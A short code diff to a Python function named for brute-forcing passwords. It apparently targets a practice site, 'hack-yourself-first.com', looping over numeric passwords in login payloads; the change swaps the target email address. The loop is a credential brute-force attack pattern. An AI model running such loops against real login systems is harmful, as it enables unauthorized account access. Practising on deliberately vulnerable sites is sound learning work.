@@ -19,7 +19,7 @@ def brute_force_attack_password_to_hack_yourself():
     # SITE_NAME = 'https://hack-yourself-first.com/'
     for i in range(123450, 123470):
         headers = {'User-Agent': 'Mozilla/5.0'}
-        payload = {'Email': 'aiwedo2878@superyp.com', 'Password': i}
+        payload = {'Email': 'hiwedo2878@superyp.com', 'Password': i}
 
         session = requests.Session()
         # session.keep_alive = False
